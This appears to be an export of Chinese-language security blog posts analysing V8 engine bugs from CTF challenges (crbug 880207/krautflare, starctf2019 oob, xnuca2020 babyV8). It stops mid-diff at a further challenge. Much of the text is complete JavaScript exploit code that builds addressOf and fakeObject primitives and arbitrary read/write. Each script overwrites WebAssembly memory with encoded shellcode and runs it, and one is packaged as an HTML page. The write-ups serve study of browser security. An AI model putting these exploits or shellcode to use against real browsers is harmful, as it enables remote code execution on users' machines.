BuiltinFunctionId::kMathExpm1:     case BuiltinFunctionId::kMathFround:     case BuiltinFunctionId::kMathLog:     case BuiltinFunctionId::kMathLog1p:diff --git a/test/mjsunit/regress/regress-crbug-880207.js b/test/mjsunit/regress/regress-crbug-880207.jsindex 09796a9ff4..0f65ddb56b 100644--- a/test/mjsunit/regress/regress-crbug-880207.js+++ b/test/mjsunit/regress/regress-crbug-880207.js@@ -4,34 +4,10 @@  // Flags: --allow-natives-syntax -(function TestOptimizedFastExpm1MinusZero() &#123;-  function foo() &#123;-    return Object.is(Math.expm1(-0), -0);-  &#125;+function foo() &#123;+  return Object.is(Math.expm1(-0), -0);+&#125; -  assertTrue(foo());-  %OptimizeFunctionOnNextCall(foo);-  assertTrue(foo());-&#125;)();--(function TestOptimizedExpm1MinusZeroSlowPath() &#123;-  function f(x) &#123;-    return Object.is(Math.expm1(x), -0);-  &#125;--  function g() &#123;-    return f(-0);-  &#125;--  f(0);-  // Compile function optimistically for numbers (with fast inlined-  // path for Math.expm1).-  %OptimizeFunctionOnNextCall(f);-  // Invalidate the optimistic assumption, deopting and marking non-number-  // input feedback in the call IC.-  f(&quot;0&quot;);-  // Optimize again, now with non-lowered call to Math.expm1.-  assertTrue(g());-  %OptimizeFunctionOnNextCall(g);-  assertTrue(g());-&#125;)();+assertTrue(foo());+%OptimizeFunctionOnNextCall(foo);+assertTrue(foo());\n这是一个v8的历史漏洞，patch将漏洞重新引入，其代号为880207，首先该漏洞出现在typer.cc中，因此猜测该漏洞出现在Typer阶段，并且该漏洞与Math.expm1(x)函数有关,Typer推断Math.expm1(x)函数的返回类型时，认为Math.expm1(x)的返回类型为PlainNumber或者Nan，却忽略了一种情况，那就是Math.expm1(-0)，其返回值为-0，而-0属于HEAP_NUMBER_TYPE类型，在JIT编译时期与运行时期，就会有不一样的结果，比如\nObject.is(Math.expm1(-0),-0)\n在编译时期，JIT认为该值肯定为false，因为两者的类型不可能相等，但是在实际运行当中，Object.is(Math.expm1(x),-0)，如果x为-0，那么结果就会为true。\n漏洞利用在javascript中，布尔类型可以直接做加减乘除运算\nfalse+11true+12\n因此，我们可以利用这种特性，将漏洞转换为一个数组越界，首先构造\nfunction opt(x) &#123;   var a = Object.is(Math.expm1(x),-0);   var arr = [1.1,2.2,3.3,4.4];   a += 3;   return arr[a];&#125;for (var i=0;i&lt;0x20000;i++) &#123;   opt(0);   opt(&quot;0&quot;);&#125;print(opt(-0));\n用opt(&quot;0&quot;);是为了适配非PlainNumber类型的参数，这样最后一步调用opt(-0)不会进行deoptimization，运行发现，没有成功越界，查看IR图可以看到JSCall[PlainNumber | NaN]，然后使用SameValue运算后，与3相加，最后得出范围Range(0,3)传给CheckBounds然而到了TypedLowering阶段，发现下标直接变成了3，即发生常数折叠为了避免发生这样的常数折叠现象，我们可以使用一个字典对象来将我们的-0包含在内部，这样，只有在Escape Analyse阶段才能知道其值。\nfunction opt(x) &#123;   var escape = &#123;v:-0&#125;;   var a = Object.is(Math.expm1(x),escape.v);   var arr = [1.1,2.2,3.3,4.4];   a += 3;   return arr[a];&#125;for (var i=0;i&lt;0x20000;i++) &#123;   opt(0);   opt(&quot;0&quot;);&#125;print(opt(-0));\n运行后发现确实发生了数组越界\nroot@ubuntu:~/Desktop/krautflare# ./d8 1.js --trace-turboConcurrent recompilation has been disabled for tracing.---------------------------------------------------Begin compiling method opt using Turbofan---------------------------------------------------Finished compiling method opt using Turbofan---------------------------------------------------Begin compiling method opt using Turbofan---------------------------------------------------Finished compiling method opt using Turbofan---------------------------------------------------Begin compiling method  using Turbofan---------------------------------------------------Finished compiling method  using Turbofan2.89459808827e-311\n查看IR图，这回在Typer阶段，还不能确定准确值，因此有一个范围Range(3,4)然后过了Escape Analyse阶段，才发现范围在Range(0,3)内，于是到了simplified lowering阶段，便把CheckBounds给去除了由此造成了溢出，可以利用溢出，构造一个oob_arr，来达到自由溢出，然后利用手法就一样了。exp\nvar buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function i2f64(value) &#123;   dv.setBigUint64(0,BigInt(value),true);   return dv.getFloat64(0,true);&#125;function u64f(value) &#123;   dv.setFloat64(0,value,true);   return dv.getBigUint64(0,true);&#125;var obj = &#123;&#125;;var oob_arr;var obj_arr;var double_arr;function opt(x) &#123;   var arr = [1.1,2.2,3.3,4.4];   oob_arr = [5.5,6.6];   obj_arr = [obj];   double_arr = [1.1];   var tmp = &#123;escapeVar: -0&#125;;   var index = Object.is(Math.expm1(x),tmp.escapeVar);   index *= 11;   //制造oob_arr   arr[index] = p64f(0,0x1000);&#125;for (var i=0;i&lt;0x20000;i++) &#123;   opt(0);   opt(&quot;0&quot;);&#125;//触发漏洞opt(-0);var double_elements_map = oob_arr[0x10];var obj_elements_map = oob_arr[0x9];function fakeObj(addr) &#123;   var addr_f = i2f64(addr + 0x1n);   double_arr[0] = addr_f;   oob_arr[0x10] = obj_elements_map;   var a = double_arr[0];   oob_arr[0x10] = double_elements_map;   return a;&#125;function addressOf(obj) &#123;   obj_arr[0] = obj;   oob_arr[0x9] = double_elements_map;   var a = obj_arr[0];   oob_arr[0x9] = obj_elements_map;   return u64f(a) - 0x1n;&#125;const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var func = wasmInstance.exports.main;var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];var faker_addr = addressOf(faker);print(&#x27;wasm=&#x27;+addressOf(wasmInstance).toString(16));/*%DebugPrint(wasmInstance);%SystemBreak();*/wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0xe8n;var element_addr = faker_addr - 0x50n;//print(&#x27;element_addr=&#x27; + element_addr.toString(16));//fake a ArrayBuffer&#x27;s Mapfaker[0] = i2f64(0n);faker[1] = i2f64(0x1900042317080808n);faker[2] = i2f64(0x00000000082003ffn);faker[3] = i2f64(0);//faker a ArrayBufferfaker[4] = i2f64(element_addr+0x1n); //mapfaker[5] = i2f64(0); //propertiesfaker[6] = i2f64(0); //elementsfaker[7] = p64f(0xffffffff,0); //lengthfaker[8] = i2f64(wasm_shellcode_ptr_addr);faker[9] = 0x2;var arb_ArrayBuffer = fakeObj(element_addr+0x20n);var adv = new DataView(arb_ArrayBuffer);var wasm_shellcode_addr = adv.getBigUint64(0,true);print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));faker[8] = i2f64(wasm_shellcode_addr);//替换wasm的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   adv.setUint32(i*4,shellcode[i],true);&#125;//执行shellcodefunc();\n0x04 感想在数值误差的漏洞当中，我们往往利用CheckBounds的消除来构造OOB数组，其中要保证这个数组是一个非逃逸对象，即在函数内部声明和使用，这样JIT收集的信息充分，才能决定是否要移除CheckBounds节点，似乎在新版本v8中，simplified lowering阶段不再去除该节点，以后遇到再看。\n0x05 参考从漏洞利用角度介绍Chrome的V8安全研究introduction-to-turbofan利用边界检查消除破解Chrome JIT编译器关于2018_35c3ctf_krautflare的分析复现\n","categories":["CTF","安全研究"],"tags":["JS引擎漏洞","类型混淆"]},{"title":"OOB类型的v8逃逸总结","url":"/2020/12/25/v8-oob/","content":"文章首发于安全KER https://www.anquanke.com/post/id/225443\n0x00 前言总结几道OOB类型的v8逃逸的利用方法，它们大多的利用手法都极为相似。\n0x01 前置知识OOB即缓冲区溢出，在v8中的OOB漏洞是比较容易利用的，一般的步骤就是利用OOB修改ArrayBuffer的backing_store和byteLength实现任意地址读写，也可以直接OOB读取和修改对象的MAP，构造addressOf和fakeObject原语。\n0x02 普通OOB0x02.00 starctf2019-oobpatch分析diff --git a/src/bootstrapper.cc b/src/bootstrapper.ccindex b027d36..ef1002f 100644--- a/src/bootstrapper.cc+++ b/src/bootstrapper.cc@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,                           Builtins::kArrayPrototypeCopyWithin, 2, false);     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,                           Builtins::kArrayPrototypeFill, 1, false);+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,+                          Builtins::kArrayOob,2,false);     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,                           Builtins::kArrayPrototypeFind, 1, false);     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.ccindex 8df340e..9b828ab 100644--- a/src/builtins/builtins-array.cc+++ b/src/builtins/builtins-array.cc@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,   return *final_length; &#125; &#125;  // namespace+BUILTIN(ArrayOob)&#123;+    uint32_t len = args.length();+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();+    Handle&lt;JSReceiver&gt; receiver;+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+            isolate, receiver, Object::ToObject(isolate, args.receiver()));+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());+    if(len == 1)&#123;+        //read+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));+    &#125;else&#123;+        //write+        Handle&lt;Object&gt; value;+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));+        elements.set(length,value-&gt;Number());+        return ReadOnlyRoots(isolate).undefined_value();+    &#125;+&#125;  BUILTIN(ArrayPush) &#123;   HandleScope scope(isolate);diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.hindex 0447230..f113a81 100644--- a/src/builtins/builtins-definitions.h+++ b/src/builtins/builtins-definitions.h@@ -368,6 +368,7 @@ namespace internal &#123;   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \\   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \\   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \\+  CPP(ArrayOob)                                                                \\                                                                                \\   /* ArrayBuffer */                                                            \\   /* ES #sec-arraybuffer-constructor */                                        \\diff --git a/src/compiler/typer.cc b/src/compiler/typer.ccindex ed1e4a5..c199e3a 100644--- a/src/compiler/typer.cc+++ b/src/compiler/typer.cc@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;       return Type::Receiver();     case Builtins::kArrayUnshift:       return t-&gt;cache_-&gt;kPositiveSafeInteger;+    case Builtins::kArrayOob:+      return Type::Receiver();      // ArrayBuffer functions.     case Builtins::kArrayBufferIsView:\n可以看到，patch为Array类型增加了一个新的函数叫oob，其具体处理的逻辑在BUILTIN(ArrayOob)函数里，当参数个数为1个时，进行读操作\n+        //read+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));\n可以看到读操作溢出了一个单位，因为下标是以0开始的，同理当参数个数为2个时，进行写操作\nelements.set(length,value-&gt;Number());\n\n其中BUILTIN(ArrayOob)的第一个参数为Array本身，因此从js层面来看，oob接收的参数要么为0个要么为1个。\n漏洞利用要利用该漏洞，我们考虑使用var a = [1.1,2.2,3.3]这种DOUBLE_ELEMENTS类型的数组，因为这种数组里的数据是unboxed的，即没有包装为HeapNumber，elements里存的就是真值。在大多数情况下，这种类型的数组其elements在内存里的位置正好位于Array对象的上方，没有间隔。测试以下代码，用gdb调试\nvar a = [1.1,2.2];%DebugPrint(a);%SystemBreak();\n查看elements里，2.2这个数据后方是什么，可以发现是Array对象的MAP，而在v8里，如果能够控制对象MAP值，那么就可以造成类型混淆，轻松构造addressOf和fakeObject原语并且可以看到这个版本的v8没有compression pointer机制，因此addressOf获得的就是对象的完整地址，然后可以轻松伪造一个ArrayBuffer实现任意地址读写，写wasm的shellcode区域。exp\n&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;body&gt;    &lt;script&gt;var a = [1.1];var unboxed_double_map = a.oob();var obj = &#123;&#125;;var b = [obj];var obj_element_map = b.oob();var buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function i2f64(value) &#123;   dv.setBigUint64(0,BigInt(value),true);   return dv.getFloat64(0,true);&#125;function u64f(value) &#123;   dv.setFloat64(0,value,true);   return dv.getBigUint64(0,true);&#125;function addressOf(obj) &#123;   b[0] = obj;   b.oob(unboxed_double_map);   var addr = u64f(b[0]) - 0x1n;   b.oob(obj_element_map);   return addr;&#125;function fakeObject(addr) &#123;   a[0] = i2f64(addr + 1n);   a.oob(obj_element_map);   var mobj = a[0];   a.oob(unboxed_double_map);   return mobj;&#125;const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var func = wasmInstance.exports.main;var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];var faker_addr = addressOf(faker);//alert(&#x27;wasm=&#x27;+addressOf(wasmInstance).toString(16));wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x88n;var element_addr = faker_addr - 0x50n;//print(&#x27;element_addr=&#x27; + element_addr.toString(16));//fake a ArrayBuffer&#x27;s Mapfaker[0] = i2f64(0n);faker[1] = i2f64(0x1900042317080808n);faker[2] = i2f64(0x00000000084003ffn);faker[3] = i2f64(0);//faker a ArrayBufferfaker[4] = i2f64(element_addr+0x1n); //mapfaker[5] = i2f64(0); //propertiesfaker[6] = i2f64(0); //elementsfaker[7] = p64f(0xffffffff,0); //lengthfaker[8] = i2f64(wasm_shellcode_ptr_addr);faker[9] = 0x2;var arb_ArrayBuffer = fakeObject(element_addr+0x20n);var adv = new DataView(arb_ArrayBuffer);var wasm_shellcode_addr = adv.getBigUint64(0,true);//alert(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));faker[8] = i2f64(wasm_shellcode_addr);//替换wasm的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   adv.setUint32(i*4,shellcode[i],true);&#125;//执行shellcodefunc();    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;\n0x02.01 xnuca2020-babyV8patch分析diff --git a/src/codegen/code-stub-assembler.cc b/src/codegen/code-stub-assembler.ccindex 16fd384..8bf435a 100644--- a/src/codegen/code-stub-assembler.cc+++ b/src/codegen/code-stub-assembler.cc@@ -2888,7 +2888,7 @@ TNode&lt;Smi&gt; CodeStubAssembler::BuildAppendJSArray(ElementsKind kind,       [&amp;](TNode&lt;Object&gt; arg) &#123;         TryStoreArrayElement(kind, &amp;pre_bailout, elements, var_length.value(),                              arg);-        Increment(&amp;var_length);+        Increment(&amp;var_length, 3);       &#125;,       first);   &#123;\n查找该函数的上层调用，发现其在TF_BUILTIN(ArrayPrototypePush, CodeStubAssembler)函数里被调用，而TF_BUILTIN(ArrayPrototypePush, CodeStubAssembler)函数是js中的Array.prototype.push函数的具体实现，因此该漏洞与push操作有关。patch以后，部分关键代码如下\n// Resize the capacity of the fixed array if it doesn&#x27;t fit.TNode&lt;IntPtrT&gt; first = arg_index-&gt;value();Node* growth = IntPtrToParameter(    IntPtrSub(UncheckedCast&lt;IntPtrT&gt;(args-&gt;GetLength(INTPTR_PARAMETERS)),              first),    mode);PossiblyGrowElementsCapacity(mode, kind, array, var_length.value(),                             &amp;var_elements, growth, &amp;pre_bailout);// Push each argument onto the end of the array now that there is enough// capacity.CodeStubAssembler::VariableList push_vars(&#123;&amp;var_length&#125;, zone());Node* elements = var_elements.value();args-&gt;ForEach(    push_vars,    [this, kind, mode, elements, &amp;var_length, &amp;pre_bailout](Node* arg) &#123;      TryStoreArrayElement(kind, mode, &amp;pre_bailout, elements,                           var_length.value(), arg);      Increment(&amp;var_length, 3, mode);    &#125;,    first, nullptr);&#123;  TNode&lt;Smi&gt; length = ParameterToTagged(var_length.value(), mode);  var_tagged_length = length;  StoreObjectFieldNoWriteBarrier(array, JSArray::kLengthOffset, length);  Goto(&amp;success);&#125;\n其中看到，在存储数据之前，先进行了扩容，但这个扩容的计算是根据元素的个数来算的，而patch后，原本每次push一个数据，末尾指针加1，现在加了3\nIncrement(&amp;var_length, 3, mode);\n最后，数据都push完成后，将var_length的值作为Array的length，这就导致了数组的length大于其本身elements的大小，导致了oob。\n漏洞利用首先测试如下代码，用gdb调试\nvar arr = [];arr[0] = 1.1;arr.push(1.1,2.2,3.3,4.4,5.5,6.6);%DebugPrint(arr);%SystemBreak();\n可以看到arr的长度为19为了验证是否溢出，我们用如下代码进一步测试\nvar arr = [];arr[0] = 1.1;arr.push(1.1,2.2,3.3,4.4,5.5,6.6);var arr2 = [1.1,2.2];%DebugPrint(arr);%DebugPrint(arr2);%SystemBreak();\n结果如下\n0x114d0808819d &lt;JSArray[19]&gt;0x114d08088259 &lt;JSArray[2]&gt;pwndbg&gt; x /20wx 0x114d0808819c0x114d0808819c:\t0x08243905\t0x080426e5\t0x080881b1\t0x000000260x114d080881ac:\t0x08042219\t0x08042a39\t0x00000022\t0x9999999a0x114d080881bc:\t0x3ff19999\t0x9999999a\t0x3ff19999\t0xfff7ffff0x114d080881cc:\t0xfff7ffff\t0xfff7ffff\t0xfff7ffff\t0x9999999a0x114d080881dc:\t0x40019999\t0xfff7ffff\t0xfff7ffff\t0xfff7ffffpwndbg&gt; x /20wx 0x114d080881b80x114d080881b8:\t0x9999999a\t0x3ff19999\t0x9999999a\t0x3ff199990x114d080881c8:\t0xfff7ffff\t0xfff7ffff\t0xfff7ffff\t0xfff7ffff0x114d080881d8:\t0x9999999a\t0x40019999\t0xfff7ffff\t0xfff7ffff0x114d080881e8:\t0xfff7ffff\t0xfff7ffff\t0x66666666\t0x400a66660x114d080881f8:\t0xfff7ffff\t0xfff7ffff\t0xfff7ffff\t0xfff7ffffpwndbg&gt; x /20wx 0x114d080882580x114d08088258:\t0x08243905\t0x080426e5\t0x08088241\t0x000000040x114d08088268:\t0x00000000\t0x00000000\t0x00000000\t0x000000000x114d08088278:\t0x00000000\t0x00000000\t0x00000000\t0x000000000x114d08088288:\t0x00000000\t0x00000000\t0x00000000\t0x000000000x114d08088298:\t0x00000000\t0x00000000\t0x00000000\t0x00000000pwndbg&gt; x /20wx 0x114d080882400x114d08088240:\t0x08042a39\t0x00000004\t0x9999999a\t0x3ff199990x114d08088250:\t0x9999999a\t0x40019999\t0x08243905\t0x080426e50x114d08088260:\t0x08088241\t0x00000004\t0x00000000\t0x000000000x114d08088270:\t0x00000000\t0x00000000\t0x00000000\t0x000000000x114d08088280:\t0x00000000\t0x00000000\t0x00000000\t0x00000000\n计算arr可访问的范围\n0x114d080881b8+19*8 = 0x114d08088250\n可以看出，这个范围已经导入arr2的elements里，由此可以知道arr可以溢出，但是还溢出不到arr2对象那里，为了能够控制arr2对象，我们将arr2改为var arr2 = new Array(1.1,2.2);可以发现，通过new创建的double Array对象，其elements位于对象下方，而不是上方。\n0x0bd3080881a5 &lt;JSArray[19]&gt;0x0bd308088249 &lt;JSArray[2]&gt;pwndbg&gt; x /20wx 0x0bd3080882480xbd308088248:\t0x08243905\t0x080426e5\t0x08088259\t0x000000040xbd308088258:\t0x08042a39\t0x00000004\t0x9999999a\t0x3ff199990xbd308088268:\t0x9999999a\t0x40019999\t0x00000000\t0x000000000xbd308088278:\t0x00000000\t0x00000000\t0x00000000\t0x000000000xbd308088288:\t0x00000000\t0x00000000\t0x00000000\t0x00000000pwndbg&gt; x /20wx 0x0bd3080882580xbd308088258:\t0x08042a39\t0x00000004\t0x9999999a\t0x3ff199990xbd308088268:\t0x9999999a\t0x40019999\t0x00000000\t0x000000000xbd308088278:\t0x00000000\t0x00000000\t0x00000000\t0x000000000xbd308088288:\t0x00000000\t0x00000000\t0x00000000\t0x000000000xbd308088298:\t0x00000000\t0x00000000\t0x00000000\t0x00000000\n这样，arr就可以溢出控制arr2对象的结构，改写arr2的length为更大，使得arr2也变为一个oob数组，然后后续利用就类似了。我们发现这个版本的v8开启了compression pointer因此利用起来可能有些麻烦，于是我们直接用构造好的oob数组来改写下方的ArrayBuffer以及直接从下方搜索数据，不再使用addressOf和fakeObject来伪造对象。exp\nvar buf = new ArrayBuffer(0x8);var dv = new DataView(buf);//将一个32位整数打包位64位浮点数function p64(val) &#123;   dv.setUint32(0,val &amp; 0xFFFFFFFF,true);   dv.setUint32(0x4,val &gt;&gt; 32,true);   var float_val = dv.getFloat64(0,true);   return float_val;&#125;//将两个32位整数打包为一个64位浮点数function p64(low4,high4) &#123;   dv.setUint32(0,low4,true);   dv.setUint32(0x4,high4,true);   var float_val = dv.getFloat64(0,true);   return float_val;&#125;//解包64位浮点数的低四字节function u64_l(val) &#123;   dv.setFloat64(0,val,true);   return dv.getUint32(0,true);&#125;//解包64位浮点数的高四字节function u64_h(val) &#123;   dv.setFloat64(0,val,true);   return dv.getUint32(0x4,true);&#125;var obj = &#123;&#125;;var arr = [];arr[0] = 1.1;arr.push(1.1,2.2,3.3,4.4,5.5,6.6);var oob_arr = new Array(1.1,2.2);var obj_arr = [obj,obj];var arb_buf = new ArrayBuffer(0x10);var d = arr[17];var double_element_map = u64_l(d);var tmp0 = u64_h(d);d = arr[18];var tmp1 = u64_l(d);print(&quot;double_element_map=&quot;+double_element_map.toString(16));arr[18] = p64(tmp1,0x100000); //修改oob_arr的lengthd = oob_arr[4];var obj_element_map = u64_l(d);print(&quot;obj_element_map=&quot; + obj_element_map.toString(16));/*function addressOf(m_obj) &#123;   obj_arr[0] = m_obj;   oob_arr[0x4] = p64(double_element_map,tmp0);   var a = u64_l(obj_arr[0]) - 0x1;   oob_arr[0x4] = p64(obj_element_map,tmp0);   return a;&#125;function fakeObject(addr) &#123;   oob_arr[0] = p64(addr + 0x1);   arr[17] = p64(obj_element_map,tmp0);   var a = oob_arr[0];   arr[17] = p64(double_element_map,tmp0);   return a;&#125;*/const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var func = wasmInstance.exports.main;var wasm_shellcode_addr_l;var wasm_shellcode_addr_h;//搜索wasm_shellcode_addrfor (var i=0xfe;i&gt;=1;i-=1) &#123;   d = oob_arr[0x31200+i];   wasm_shellcode_addr_l = u64_h(d);   d = oob_arr[0x31200+i+1];   wasm_shellcode_addr_h = u64_l(d);   if (parseInt(wasm_shellcode_addr_h) != 0 &amp;&amp; parseInt(wasm_shellcode_addr_l) != 0 &amp;&amp; parseInt(wasm_shellcode_addr_l &amp; 0xFFF) == 0) &#123;      print(&quot;wasm_shellcode_addr=&quot; + wasm_shellcode_addr_h.toString(16) + wasm_shellcode_addr_l.toString(16));      break;   &#125;&#125;oob_arr[0x7] = p64(tmp0,0x1000); //修改ArrayBuffer的lengthoob_arr[0x8] = p64(0,wasm_shellcode_addr_l); //backing_stroeoob_arr[0x9] = p64(wasm_shellcode_addr_h,0);oob_arr[0xa] = p64(0x2,0);var adv = new DataView(arb_buf);//替换wasm的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   adv.setUint32(i*4,shellcode[i],true);&#125;//执行shellcodefunc();\n0x03 callback中的OOB0x03.00 数字经济-final-browserpatch分析diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.ccindex e6ab965a7e..9e5eb73c34 100644--- a/src/builtins/builtins-array.cc+++ b/src/builtins/builtins-array.cc@@ -362,6 +362,36 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate, &#125; &#125;  // namespace +// Vulnerability is here+// You can&#x27;t use this vulnerability in Debug Build :)+BUILTIN(ArrayCoin) &#123;+  uint32_t len = args.length();+  if (len != 3) &#123;+     return ReadOnlyRoots(isolate).undefined_value();+  &#125;+  Handle&lt;JSReceiver&gt; receiver;+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+         isolate, receiver, Object::ToObject(isolate, args.receiver()));+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());++  Handle&lt;Object&gt; value;+  Handle&lt;Object&gt; length;+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+             isolate, length, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+             isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(2)));++  uint32_t array_length = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());+  if(37 &lt; array_length)&#123;+    elements.set(37, value-&gt;Number());+    return ReadOnlyRoots(isolate).undefined_value();  +  &#125;+  else&#123;+    return ReadOnlyRoots(isolate).undefined_value();+  &#125;+&#125;+ BUILTIN(ArrayPush) &#123;   HandleScope scope(isolate);   Handle&lt;Object&gt; receiver = args.receiver();diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.hindex 3412edb89d..1837771098 100644--- a/src/builtins/builtins-definitions.h+++ b/src/builtins/builtins-definitions.h@@ -367,6 +367,7 @@ namespace internal &#123;   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \\   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \\   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \\+  CPP(ArrayCoin)                                   \\                                                                                \\   /* ArrayBuffer */                                                            \\   /* ES #sec-arraybuffer-constructor */                                        \\diff --git a/src/compiler/typer.cc b/src/compiler/typer.ccindex f5fa8f19fe..03a7b601aa 100644--- a/src/compiler/typer.cc+++ b/src/compiler/typer.cc@@ -1701,6 +1701,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;       return Type::Receiver();     case Builtins::kArrayUnshift:       return t-&gt;cache_-&gt;kPositiveSafeInteger;+    case Builtins::kArrayCoin:+      return Type::Receiver();      // ArrayBuffer functions.     case Builtins::kArrayBufferIsView:diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.ccindex 